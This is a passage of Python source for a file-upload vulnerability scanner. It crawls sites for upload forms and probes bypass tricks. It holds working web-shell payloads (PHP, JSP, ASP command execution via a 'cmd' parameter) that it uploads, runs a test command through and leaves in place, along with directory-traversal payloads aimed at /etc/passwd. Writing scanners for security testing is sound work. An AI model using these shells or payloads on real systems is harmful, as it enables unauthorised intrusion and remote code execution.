import uuid
import asyncio
import aiohttp
import os
import random
import string
import mimetypes
from typing import List, Dict, Any, Set, Optional, Tuple
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, unquote
import re

class EnhancedFileUploadScanner:
    """
    Enhanced scanner for detecting file upload vulnerabilities.
    """
    
    # Dangerous file extensions to test
    dangerous_extensions = [
        ".php", ".php5", ".phtml", ".php3", ".php4", ".php7", ".phps", ".pht", ".phar", ".inc",
        ".jsp", ".jspx", ".jspf", ".jsw", ".jsv", ".jtml",
        ".asp", ".aspx", ".ascx", ".ashx", ".asmx", ".cer", ".asa", ".asax",
        ".cgi", ".pl", ".py", ".pyc", ".pyo", ".sh", ".bash", ".ksh", ".zsh", ".ps1",
        ".htaccess", ".htpasswd", ".ini", ".config", ".conf", ".settings",
        ".shtml", ".hta", ".ml", ".rb", ".cfg", ".xml", ".xsl", ".xslt", ".svg", ".rss",
        ".jar", ".war", ".exe", ".dll", ".bat", ".cmd", ".vbs", ".vbe", ".msi"
    ]
    
    # MIME types to try bypassing restrictions
    mime_types = [
        "image/jpeg", "image/png", "image/gif", "application/pdf",
        "text/plain", "text/html", "application/octet-stream",
        "application/x-msdownload", "application/x-php", "application/x-httpd-php",
        "application/vnd.ms-excel", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "application/zip", "application/x-zip-compressed"
    ]
    
    # Maximum number of concurrent requests
    max_concurrent_requests = 5
    
    # Maximum upload file size (3MB)
    max_file_size = 3 * 1024 * 1024
    
    def __init__(self):
        """Initialize the scanner."""
        self.upload_dir = os.path.join(os.path.dirname(__file__), "upload_tests")
        os.makedirs(self.upload_dir, exist_ok=True)
    
    async def scan_url(self, url: str) -> List[Dict[str, Any]]:
        """
        Scan a URL for file upload vulnerabilities.
        
        Args:
            url: The URL to scan
            
        Returns:
            List of vulnerabilities found
        """
        print(f"Starting Enhanced File Upload scan for URL: {url}")
        vulnerabilities = []
        
        try:
            # Create a semaphore to limit concurrent requests
            semaphore = asyncio.Semaphore(self.max_concurrent_requests)
            
            # Find forms with file upload fields
            upload_forms = await self._find_upload_forms(url, semaphore)
            if upload_forms:
                print(f"Found {len(upload_forms)} forms with file upload fields")
                
                # Test each form
                form_tasks = []
                for form in upload_forms:
                    task = self._test_upload_form(url, form, semaphore)
                    form_tasks.append(task)
                
                form_results = await asyncio.gather(*form_tasks, return_exceptions=True)
                for result in form_results:
                    if isinstance(result, list):
                        vulnerabilities.extend(result)
            
            # Look for potential upload paths
            upload_paths_data = await self._find_potential_upload_paths(url, semaphore)
            if upload_paths_data:
                total_paths = len(upload_paths_data)
                verified_paths = [p for p in upload_paths_data if p.get("verified", False)]
                directory_listings = [p for p in upload_paths_data if p.get("directory_listing", False)]
                
                print(f"Found {total_paths} potential upload paths ({len(verified_paths)} verified)")
                
                # Add potential upload paths to vulnerabilities list as informational items
                if total_paths > 0:
                    # Create group entry for all upload paths
                    upload_paths_severity = "low"
                    if total_paths > 20:
                        upload_paths_severity = "medium"
                    if total_paths > 50 or len(directory_listings) > 0:
                        upload_paths_severity = "high"
                    
                    # Extract just the URLs for the report
                    path_urls = [p["url"] for p in upload_paths_data]
                    
                    upload_paths_vulnerability = {
                        "id": str(uuid.uuid4()),
                        "name": "Potential File Upload Paths Detected",
                        "description": f"Found {total_paths} potential file upload paths that could be used for file upload attacks",
                        "severity": upload_paths_severity,
                        "location": url,
                        "evidence": f"Found {total_paths} upload directories ({len(verified_paths)} verified, {len(directory_listings)} with directory listing)",
                        "remediation": "Review and secure these upload paths. Consider implementing proper access controls and validations for file uploads.",
                        "upload_paths": path_urls[:10],  # Include first 10 paths as examples
                        "verified_paths": [p["url"] for p in verified_paths][:10]
                    }
                    vulnerabilities.append(upload_paths_vulnerability)
                    
                    # Specifically report directory listings as they are a security concern
                    if directory_listings:
                        vulnerabilities.append({
                            "id": str(uuid.uuid4()),
                            "name": "Directory Listing Enabled on Upload Paths",
                            "description": f"Found {len(directory_listings)} upload directories with directory listing enabled",
                            "severity": "high",
                            "location": directory_listings[0]["url"],
                            "evidence": f"Directory listing enabled on {', '.join([p['url'] for p in directory_listings[:5]])}",
                            "remediation": "Disable directory listing on web servers and ensure upload directories are properly protected."
                        })
                    
                    # Report individual upload paths if many were found and they're likely important
                    if total_paths > 10:
                        # Group the paths by domain/subdomain for better organization
                        grouped_paths = {}
                        for path_data in upload_paths_data:
                            parsed = urlparse(path_data["url"])
                            domain = parsed.netloc
                            if domain not in grouped_paths:
                                grouped_paths[domain] = []
                            grouped_paths[domain].append(path_data)
                        
                        # Report each group
                        for domain, paths in grouped_paths.items():
                            domain_verified_paths = [p for p in paths if p.get("verified", False)]
                            
                            domain_severity = "low"
                            if len(paths) > 10 or domain_verified_paths:
                                domain_severity = "medium"
                            if len(paths) > 20 or any(p.get("directory_listing", False) for p in paths):
                                domain_severity = "high"
                                
                            vulnerabilities.append({
                                "id": str(uuid.uuid4()),
                                "name": f"Multiple Upload Paths on {domain}",
                                "description": f"Found {len(paths)} potential file upload paths on {domain} ({len(domain_verified_paths)} verified)",
                                "severity": domain_severity,
                                "location": f"https://{domain}/",
                                "evidence": f"Paths: {', '.join([p['url'] for p in paths[:5]])}...",
                                "remediation": "Review and secure upload directories. Implement proper access controls and file validation."
                            })
                
                # Check for directory traversal in upload paths
                traversal_vulns = await self._check_directory_traversal(url, upload_paths_data, semaphore)
                vulnerabilities.extend(traversal_vulns)
            
        except Exception as e:
            print(f"Error scanning for file upload vulnerabilities: {str(e)}")
        
        return vulnerabilities
    
    async def _find_upload_forms(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Find forms with file upload fields in the HTML content.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            List of forms with file upload fields
        """
        upload_forms = []
        
        try:
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=10) as response:
                        if response.status == 200:
                            html_content = await response.text()
                            
                            # Parse the HTML
                            soup = BeautifulSoup(html_content, 'html.parser')
                            forms = soup.find_all('form')
                            
                            for form in forms:
                                file_inputs = form.find_all('input', {'type': 'file'})
                                
                                if file_inputs:
                                    # Get form action URL
                                    action = form.get('action', '')
                                    method = form.get('method', 'get').lower()
                                    
                                    # Resolve form action URL
                                    if not action:
                                        form_url = url
                                    else:
                                        form_url = urljoin(url, action)
                                    
                                    # Get all form fields
                                    fields = []
                                    for input_field in form.find_all(['input', 'textarea', 'select']):
                                        field_type = input_field.get('type', '')
                                        field_name = input_field.get('name', '')
                                        
                                        if field_name:
                                            fields.append({
                                                'name': field_name,
                                                'type': field_type,
                                                'value': input_field.get('value', '')
                                            })
                                    
                                    # Get multipart encoding
                                    enctype = form.get('enctype', '')
                                    
                                    upload_forms.append({
                                        'url': form_url,
                                        'method': method,
                                        'enctype': enctype,
                                        'fields': fields
                                    })
                                    
                            # Also check for JavaScript-based upload forms or buttons
                            js_upload_elements = soup.find_all(['input', 'button', 'a'], text=re.compile(r'upload|browse|choose\s+file', re.I))
                            js_upload_elements.extend(soup.find_all(['input', 'button', 'a'], {'id': re.compile(r'upload|file', re.I)}))
                            js_upload_elements.extend(soup.find_all(['input', 'button', 'a'], {'class': re.compile(r'upload|file', re.I)}))
                            js_upload_elements.extend(soup.find_all(['input', 'button', 'a'], {'name': re.compile(r'upload|file', re.I)}))
                            
                            for element in js_upload_elements:
                                # This is a potential JS-based upload form
                                if element.name == 'a':
                                    js_form_url = urljoin(url, element.get('href', ''))
                                else:
                                    js_form_url = url
                                
                                # If not already in our forms list
                                if not any(form['url'] == js_form_url for form in upload_forms):
                                    upload_forms.append({
                                        'url': js_form_url,
                                        'method': 'post',  # Assume POST for JS uploads
                                        'enctype': 'multipart/form-data',  # Assume multipart for JS uploads
                                        'fields': [{'name': 'file', 'type': 'file', 'value': ''}],  # Assume a default file field
                                        'js_based': True
                                    })
            
            # Also crawl links for potential upload pages
            links = await self._extract_links(url, semaphore)
            upload_keywords = ['upload', 'file', 'attachment', 'import', 'avatar', 'profile', 'photo']
            
            for link in links:
                if any(keyword in link.lower() for keyword in upload_keywords):
                    # This link might lead to an upload page
                    link_upload_forms = await self._find_upload_forms(link, semaphore)
                    for form in link_upload_forms:
                        if not any(existing_form['url'] == form['url'] for existing_form in upload_forms):
                            upload_forms.append(form)
        
        except Exception as e:
            print(f"Error finding upload forms: {str(e)}")
        
        return upload_forms
    
    async def _extract_links(self, url: str, semaphore: asyncio.Semaphore) -> List[str]:
        """
        Extract links from a page.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            List of links
        """
        links = []
        
        try:
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=10) as response:
                        if response.status == 200:
                            html_content = await response.text()
                            
                            # Parse the HTML
                            soup = BeautifulSoup(html_content, 'html.parser')
                            
                            # Get the base URL for resolving relative URLs
                            base_url = url
                            base_tag = soup.find('base')
                            if base_tag and base_tag.get('href'):
                                base_url = base_tag['href']
                            
                            # Extract links
                            for a_tag in soup.find_all('a', href=True):
                                href = a_tag['href']
                                if href and not href.startswith(('#', 'javascript:', 'mailto:', 'tel:')):
                                    abs_url = urljoin(base_url, href)
                                    if abs_url not in links:
                                        links.append(abs_url)
        
        except Exception as e:
            print(f"Error extracting links: {str(e)}")
        
        return links
    
    async def _find_potential_upload_paths(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Find potential upload paths on the website and check if they exist.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            List of potential upload paths with metadata
        """
        potential_paths = []
        verified_paths = []
        
        # Common upload directories
        common_upload_dirs = [
            'uploads', 'upload', 'files', 'file', 'attachments', 'attachment',
            'images', 'img', 'photos', 'photo', 'pictures', 'media', 'static',
            'data', 'content', 'assets', 'documents', 'docs', 'downloads',
            'temp', 'tmp', 'cache', 'public', 'private', 'protected', 'admin',
            'user', 'users', 'profiles', 'avatars', 'gallery', 'galleries'
        ]
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Generate paths to test
        for directory in common_upload_dirs:
            potential_paths.append({
                "url": f"{base_url}/{directory}",
                "verified": False,
                "status_code": None,
                "content_type": None,
                "directory_listing": False
            })
            
            # Also try deeper paths
            potential_paths.append({
                "url": f"{url.rstrip('/')}/{directory}",
                "verified": False,
                "status_code": None,
                "content_type": None,
                "directory_listing": False
            })
        
        # Check if the paths exist
        check_tasks = []
        for path_data in potential_paths:
            task = self._check_path_exists(path_data["url"], semaphore)
            check_tasks.append(task)
        
        # Wait for all checks to complete
        results = await asyncio.gather(*check_tasks, return_exceptions=True)
        
        # Process results
        for i, result in enumerate(results):
            if isinstance(result, dict) and result.get("exists"):
                potential_paths[i].update(result)
                verified_paths.append(potential_paths[i])
        
        # Return all verified paths and a limited number of unverified paths
        return verified_paths + [p for p in potential_paths if not p["verified"]][:50]
    
    async def _check_path_exists(self, url: str, semaphore: asyncio.Semaphore) -> Dict[str, Any]:
        """
        Check if a path exists and get metadata about it.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            Dict with path metadata
        """
        result = {
            "exists": False,
            "status_code": 404,
            "content_type": None,
            "directory_listing": False,
            "verified": False,
            "size": 0
        }
        
        try:
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=5, allow_redirects=True) as response:
                        result["status_code"] = response.status
                        
                        if response.status == 200:
                            result["exists"] = True
                            result["verified"] = True
                            result["content_type"] = response.headers.get("Content-Type", "")
                            
                            # Check the size
                            content = await response.text()
                            result["size"] = len(content)
                            
                            # Check for directory listing
                            result["directory_listing"] = (
                                "Index of" in content and
                                ("<tr>" in content or "<TR>" in content) and
                                ("Name" in content or "Size" in content or "Modified" in content)
                            )
                        elif response.status in [301, 302, 303, 307, 308]:
                            # Redirects often indicate the path exists but is protected
                            result["exists"] = True
                            result["verified"] = True
                        elif response.status == 403:
                            # Forbidden means the path exists but we can't access it
                            result["exists"] = True
                            result["verified"] = True
        
        except Exception as e:
            print(f"Error checking path {url}: {str(e)}")
        
        return result
    
    async def _check_directory_traversal(self, url: str, upload_paths: List[Dict[str, Any]], semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check for directory traversal vulnerabilities in upload paths.
        
        Args:
            url: The base URL
            upload_paths: List of upload paths to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        # Directory traversal payloads
        traversal_payloads = [
            '../', '..\\', '..%2f', '..%5c', '%2e%2e%2f', '%2e%2e%5c',
            '..%252f', '..%255c', '..%c0%af', '..%c1%9c'
        ]
        
        # First check only verified paths or paths that are likely to exist
        priority_paths = [p for p in upload_paths if p.get("verified", False) or p.get("status_code") in [200, 301, 302, 307, 403]]
        
        # If no priority paths, check a limited number of potential paths
        if not priority_paths:
            priority_paths = upload_paths[:10]
        
        for path_data in priority_paths:
            path_url = path_data["url"]
            for payload in traversal_payloads:
                traversal_url = f"{path_url}/{payload}etc/passwd"
                
                try:
                    async with semaphore:
                        async with aiohttp.ClientSession() as session:
                            async with session.get(traversal_url, timeout=10) as response:
                                if response.status == 200:
                                    content = await response.text()
                                    
                                    # Check for signs of successful traversal
                                    if 'root:' in content and 'bin:' in content:
                                        vulnerabilities.append({
                                            "id": str(uuid.uuid4()),
                                            "name": "Directory Traversal in Upload Path",
                                            "description": "Directory traversal vulnerability detected in upload path",
                                            "severity": "high",
                                            "location": path_url,
                                            "evidence": f"Path {path_url} is vulnerable to directory traversal with payload {payload}",
                                            "remediation": "Validate and sanitize file paths. Use a whitelist approach for allowed directories."
                                        })
                except Exception:
                    pass
        
        return vulnerabilities
    
    async def _test_upload_form(self, base_url: str, form: Dict[str, Any], semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Test a form for file upload vulnerabilities.
        
        Args:
            base_url: The base URL
            form: The form to test
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            form_url = form['url']
            method = form['method']
            fields = form['fields']
            
            # Find file upload fields
            file_fields = [field for field in fields if field['type'] == 'file']
            
            if not file_fields:
                return []
            
            # Test each file field for vulnerabilities
            for file_field in file_fields:
                field_name = file_field['name']
                
                # Test for file extension bypass
                ext_bypass_vulns = await self._test_extension_bypass(form_url, method, fields, field_name, semaphore)
                vulnerabilities.extend(ext_bypass_vulns)
                
                # Test for content type bypass
                content_bypass_vulns = await self._test_content_type_bypass(form_url, method, fields, field_name, semaphore)
                vulnerabilities.extend(content_bypass_vulns)
                
                # Test for null byte bypass
                null_byte_vulns = await self._test_null_byte_bypass(form_url, method, fields, field_name, semaphore)
                vulnerabilities.extend(null_byte_vulns)
                
                # Test for double extension bypass
                double_ext_vulns = await self._test_double_extension_bypass(form_url, method, fields, field_name, semaphore)
                vulnerabilities.extend(double_ext_vulns)
                
                # Test for case sensitivity bypass
                case_vulns = await self._test_case_sensitivity_bypass(form_url, method, fields, field_name, semaphore)
                vulnerabilities.extend(case_vulns)
                
                # Test for unrestricted file upload
                unrestricted_vulns = await self._test_unrestricted_upload(form_url, method, fields, field_name, semaphore)
                vulnerabilities.extend(unrestricted_vulns)
        
        except Exception as e:
            print(f"Error testing form: {str(e)}")
        
        return vulnerabilities
    
    async def _test_extension_bypass(self, form_url: str, method: str, fields: List[Dict[str, Any]], 
                                   field_name: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Test for file extension filter bypass.
        
        Args:
            form_url: The form URL
            method: The HTTP method
            fields: The form fields
            field_name: The file field name
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        # PHP shell payload for testing
        php_payload = '<?php echo "VULN_TEST_" . rand(1000,9999); ?>'
        
        # Test dangerous extensions
        for ext in self.dangerous_extensions:
            if ext.startswith('.php'):
                # Generate a unique filename
                random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
                filename = f"{random_name}{ext}"
                mime_type = "application/octet-stream"
                
                # Create a test file with the PHP payload
                content = php_payload.encode()
                
                # Try to upload the file
                upload_result = await self._try_upload(form_url, method, fields, field_name, filename, content, mime_type, semaphore)
                
                if upload_result and upload_result.get('success'):
                    uploaded_url = upload_result.get('url', '')
                    
                    # Check if the uploaded file is accessible and executed
                    if uploaded_url:
                        is_executed = await self._check_file_executed(uploaded_url, "VULN_TEST_", semaphore)
                        
                        if is_executed:
                            vulnerabilities.append({
                                "id": str(uuid.uuid4()),
                                "name": "Unrestricted PHP File Upload",
                                "description": f"Successfully uploaded and executed a PHP file with extension {ext}",
                                "severity": "critical",
                                "location": form_url,
                                "evidence": f"Uploaded {filename} to {uploaded_url} and executed PHP code",
                                "remediation": "Implement strict file type validation, whitelist allowed extensions, validate content type, and store uploaded files outside the web root."
                            })
                            break  # Found a vulnerability, no need to test more extensions
        
        return vulnerabilities
    
    async def _test_content_type_bypass(self, form_url: str, method: str, fields: List[Dict[str, Any]], 
                                     field_name: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Test for content type validation bypass.
        
        Args:
            form_url: The form URL
            method: The HTTP method
            fields: The form fields
            field_name: The file field name
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        # PHP shell payload
        php_payload = '<?php echo "MIME_BYPASS_" . rand(1000,9999); ?>'
        
        # Generate a unique filename
        random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        filename = f"{random_name}.php"
        
        # Try different MIME types to bypass content type checks
        for mime_type in ["image/jpeg", "image/png", "image/gif", "application/pdf"]:
            content = php_payload.encode()
            
            # Try to upload the file with the image MIME type
            upload_result = await self._try_upload(form_url, method, fields, field_name, filename, content, mime_type, semaphore)
            
            if upload_result and upload_result.get('success'):
                uploaded_url = upload_result.get('url', '')
                
                # Check if the uploaded file is accessible and executed
                if uploaded_url:
                    is_executed = await self._check_file_executed(uploaded_url, "MIME_BYPASS_", semaphore)
                    
                    if is_executed:
                        vulnerabilities.append({
                            "id": str(uuid.uuid4()),
                            "name": "Content Type Validation Bypass",
                            "description": f"Successfully bypassed content type validation using MIME type {mime_type}",
                            "severity": "critical",
                            "location": form_url,
                            "evidence": f"Uploaded PHP file with MIME type {mime_type} to {uploaded_url}",
                            "remediation": "Validate file content in addition to content type. Use libraries that analyze file content signatures rather than relying solely on MIME types."
                        })
                        break  # Found a vulnerability, no need to test more MIME types
        
        return vulnerabilities
    
    async def _test_null_byte_bypass(self, form_url: str, method: str, fields: List[Dict[str, Any]], 
                                  field_name: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Test for null byte injection bypass.
        
        Args:
            form_url: The form URL
            method: The HTTP method
            fields: The form fields
            field_name: The file field name
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        # PHP shell payload
        php_payload = '<?php echo "NULL_BYTE_BYPASS_" . rand(1000,9999); ?>'
        
        # Generate a unique filename with null byte
        random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        filename = f"{random_name}.php%00.jpg"  # Null byte in filename
        content = php_payload.encode()
        mime_type = "image/jpeg"
        
        # Try to upload the file
        upload_result = await self._try_upload(form_url, method, fields, field_name, filename, content, mime_type, semaphore)
        
        if upload_result and upload_result.get('success'):
            uploaded_url = upload_result.get('url', '')
            
            # Check if the uploaded file is accessible and executed
            if uploaded_url:
                # Try both with and without the null byte in the URL
                clean_url = uploaded_url.replace('%00', '')
                
                is_executed = await self._check_file_executed(uploaded_url, "NULL_BYTE_BYPASS_", semaphore)
                if not is_executed:
                    is_executed = await self._check_file_executed(clean_url, "NULL_BYTE_BYPASS_", semaphore)
                
                if is_executed:
                    vulnerabilities.append({
                        "id": str(uuid.uuid4()),
                        "name": "Null Byte Injection Bypass",
                        "description": "Successfully bypassed file extension validation using null byte injection",
                        "severity": "critical",
                        "location": form_url,
                        "evidence": f"Uploaded {filename} and executed PHP code",
                        "remediation": "Use secure file handling functions that are not vulnerable to null byte injection. Properly sanitize filenames and validate file types."
                    })
        
        return vulnerabilities
    
    async def _test_double_extension_bypass(self, form_url: str, method: str, fields: List[Dict[str, Any]], 
                                         field_name: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Test for double extension bypass.
        
        Args:
            form_url: The form URL
            method: The HTTP method
            fields: The form fields
            field_name: The file field name
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        # PHP shell payload
        php_payload = '<?php echo "DOUBLE_EXT_BYPASS_" . rand(1000,9999); ?>'
        
        # Test double extensions
        double_extensions = [".php.jpg", ".php.png", ".php.gif", ".php.pdf", ".php.txt"]
        
        for ext in double_extensions:
            # Generate a unique filename
            random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            filename = f"{random_name}{ext}"
            
            # Determine MIME type based on the second extension
            mime_type = mimetypes.guess_type(filename)[0] or "application/octet-stream"
            content = php_payload.encode()
            
            # Try to upload the file
            upload_result = await self._try_upload(form_url, method, fields, field_name, filename, content, mime_type, semaphore)
            
            if upload_result and upload_result.get('success'):
                uploaded_url = upload_result.get('url', '')
                
                # Check if the uploaded file is accessible and executed
                if uploaded_url:
                    is_executed = await self._check_file_executed(uploaded_url, "DOUBLE_EXT_BYPASS_", semaphore)
                    
                    if is_executed:
                        vulnerabilities.append({
                            "id": str(uuid.uuid4()),
                            "name": "Double Extension Bypass",
                            "description": f"Successfully bypassed file type validation using double extension {ext}",
                            "severity": "high",
                            "location": form_url,
                            "evidence": f"Uploaded {filename} to {uploaded_url} and executed PHP code",
                            "remediation": "Implement proper file type validation that doesn't rely solely on file extensions. Strip or sanitize filenames before saving."
                        })
                        break  # Found a vulnerability, no need to test more extensions
        
        return vulnerabilities
    
    async def _test_case_sensitivity_bypass(self, form_url: str, method: str, fields: List[Dict[str, Any]], 
                                          field_name: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Test for case sensitivity bypass.
        
        Args:
            form_url: The form URL
            method: The HTTP method
            fields: The form fields
            field_name: The file field name
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        # PHP shell payload
        php_payload = '<?php echo "CASE_BYPASS_" . rand(1000,9999); ?>'
        
        # Test case variations
        case_variations = [".pHp", ".PhP", ".pHP", ".PHp", ".Php", ".PHP"]
        
        for ext in case_variations:
            # Generate a unique filename
            random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            filename = f"{random_name}{ext}"
            content = php_payload.encode()
            mime_type = "application/octet-stream"
            
            # Try to upload the file
            upload_result = await self._try_upload(form_url, method, fields, field_name, filename, content, mime_type, semaphore)
            
            if upload_result and upload_result.get('success'):
                uploaded_url = upload_result.get('url', '')
                
                # Check if the uploaded file is accessible and executed
                if uploaded_url:
                    is_executed = await self._check_file_executed(uploaded_url, "CASE_BYPASS_", semaphore)
                    
                    if is_executed:
                        vulnerabilities.append({
                            "id": str(uuid.uuid4()),
                            "name": "Case Sensitivity Bypass",
                            "description": f"Successfully bypassed file type validation using case sensitivity {ext}",
                            "severity": "high",
                            "location": form_url,
                            "evidence": f"Uploaded {filename} to {uploaded_url} and executed PHP code",
                            "remediation": "Implement case-insensitive file extension checks. Convert filenames to lowercase before validation."
                        })
                        break  # Found a vulnerability, no need to test more variations
        
        return vulnerabilities
    
    async def _test_unrestricted_upload(self, form_url: str, method: str, fields: List[Dict[str, Any]], 
                                     field_name: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Test for unrestricted file upload vulnerabilities.
        
        Args:
            form_url: The form URL
            method: The HTTP method
            fields: The form fields
            field_name: The file field name
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        # Generate a unique identifiable string
        test_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        
        # Test for web shells
        php_shell = f'<?php echo "UNRESTRICTED_UPLOAD_{test_id}"; system($_GET["cmd"]); ?>'
        jsp_shell = f'<% out.println("UNRESTRICTED_UPLOAD_{test_id}"); Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
        asp_shell = f'<% Response.Write("UNRESTRICTED_UPLOAD_{test_id}") : CreateObject("WScript.Shell").Run(Request.QueryString("cmd")) %>'
        
        shells = [
            {"ext": ".php", "content": php_shell, "mime": "application/x-php"},
            {"ext": ".jsp", "content": jsp_shell, "mime": "application/octet-stream"},
            {"ext": ".asp", "content": asp_shell, "mime": "application/octet-stream"},
            {"ext": ".aspx", "content": asp_shell, "mime": "application/octet-stream"}
        ]
        
        for shell in shells:
            # Generate a unique filename
            random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            filename = f"{random_name}{shell['ext']}"
            content = shell['content'].encode()
            mime_type = shell['mime']
            
            # Try to upload the shell
            upload_result = await self._try_upload(form_url, method, fields, field_name, filename, content, mime_type, semaphore)
            
            if upload_result and upload_result.get('success'):
                uploaded_url = upload_result.get('url', '')
                
                # Check if the uploaded file is accessible and executed
                if uploaded_url:
                    is_executed = await self._check_file_executed(uploaded_url, f"UNRESTRICTED_UPLOAD_{test_id}", semaphore)
                    
                    if is_executed:
                        vulnerabilities.append({
                            "id": str(uuid.uuid4()),
                            "name": f"Unrestricted {shell['ext'].upper()} Shell Upload",
                            "description": f"Successfully uploaded and executed a web shell with {shell['ext']} extension",
                            "severity": "critical",
                            "location": form_url,
                            "evidence": f"Uploaded {filename} to {uploaded_url} and executed code",
                            "remediation": "Implement strict file type validation, whitelist allowed extensions, validate content type, and store uploaded files outside the web root."
                        })
                        
                        # Test command execution
                        cmd_param = "?cmd=echo+COMMAND_EXECUTION_TEST"
                        cmd_url = uploaded_url + cmd_param
                        
                        try:
                            async with semaphore:
                                async with aiohttp.ClientSession() as session:
                                    async with session.get(cmd_url, timeout=10) as response:
                                        if response.status == 200:
                                            resp_text = await response.text()
                                            
                                            if "COMMAND_EXECUTION_TEST" in resp_text:
                                                vulnerabilities.append({
                                                    "id": str(uuid.uuid4()),
                                                    "name": "Remote Command Execution via Uploaded Shell",
                                                    "description": "The uploaded web shell allows remote command execution",
                                                    "severity": "critical",
                                                    "location": cmd_url,
                                                    "evidence": "Successfully executed system commands via the uploaded shell",
                                                    "remediation": "Implement proper file upload validation and disable dangerous functions in the server configuration."
                                                })
                        except Exception:
                            pass
                        
                        # Break out of the shells loop once we find a vulnerability
                        break
        
        return vulnerabilities
    
    async def _try_upload(self, form_url: str, method: str, fields: List[Dict[str, Any]], 
                        field_name: str, filename: str, content: bytes, mime_type: str, 
                        semaphore: asyncio.Semaphore) -> Optional[Dict[str, Any]]:
        """
        Try to upload a file to the form.
        
        Args:
            form_url: The form URL
            method: The HTTP method
            fields: The form fields
            field_name: The file field name
            filename: The filename to upload
            content: The file content
            mime_type: The MIME type
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            Dictionary with upload result information or None if failed
        """
        try:
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    # Prepare form data
                    data = aiohttp.FormData()
                    
                    # Add regular form fields
                    for field in fields:
                        if field['type'] != 'file' and field['name'] != field_name:
                            data.add_field(field['name'], field.get('value', ''))
                    
                    # Add the file
                    data.add_field(field_name, content, 
                                  filename=filename, 
                                  content_type=mime_type)
                    
                    # Send the upload request
                    if method.lower() == 'post':
                        async with session.post(form_url, data=data, timeout=30, allow_redirects=True) as response:
                            # Get the response content
                            response_text = await response.text()
                            
                            # Check if upload was successful
                            if response.status in [200, 201, 202]:
                                # Try to extract the uploaded file URL from the response
                                upload_url = self._extract_upload_url(response_text, filename, form_url)
                                
                                # If we found a URL, return success
                                if upload_url:
                                    return {
                                        'success': True,
                                        'url': upload_url,
                                        'status': response.status,
                                        'content_length': len(response_text)
                                    }
                            
                            # Check for error messages in the response
                            error_patterns = [
                                'invalid file', 'not allowed', 'invalid type', 'forbidden extension',
                                'file type not supported', 'unsupported file', 'security check',
                                'only allow', 'expect', 'extension', 'type', 'sorry', 'error',
                                'failed', 'rejected'
                            ]
                            
                            for pattern in error_patterns:
                                if pattern in response_text.lower():
                                    return {
                                        'success': False,
                                        'status': response.status,
                                        'error': f"Found error pattern: '{pattern}' in response"
                                    }
                            
                            # If no error patterns found and status is 200, assume success
                            if response.status == 200:
                                return {
                                    'success': True,
                                    'url': None,  # We couldn't find the URL
                                    'status': response.status,
                                    'content_length': len(response_text)
                                }
        
        except Exception as e:
            print(f"Error uploading file {filename}: {str(e)}")
        
        return None
    
    def _extract_upload_url(self, response_text: str, filename: str, base_url: str) -> Optional[str]:
        """
        Extract the URL of the uploaded file from the response.
        
        Args:
            response_text: The HTTP response text
            filename: The uploaded filename
            base_url: The base URL of the form
            
        Returns:
            The URL of the uploaded file or None if not found
        """
        try:
            # Parse the HTML
            soup = BeautifulSoup(response_text, 'html.parser')
            
            # Remove the extension for more flexible searching
            filename_noext = os.path.splitext(filename)[0]
            
            # Patterns to look for in attributes
            attributes_to_check = ['src', 'href', 'data', 'content', 'value']
            
            # Check various elements that might contain the uploaded file URL
            elements = []
            for attr in attributes_to_check:
                elements.extend(soup.find_all(attrs={attr: re.compile(filename_noext, re.I)}))
                elements.extend(soup.find_all(attrs={attr: re.compile(r'upload|file|attachment', re.I)}))
            
            for element in elements:
                for attr in attributes_to_check:
                    if element.has_attr(attr):
                        attr_value = element[attr]
                        if filename_noext.lower() in attr_value.lower() or '/upload' in attr_value or '/file' in attr_value:
                            # This might be the uploaded file URL
                            return urljoin(base_url, attr_value)
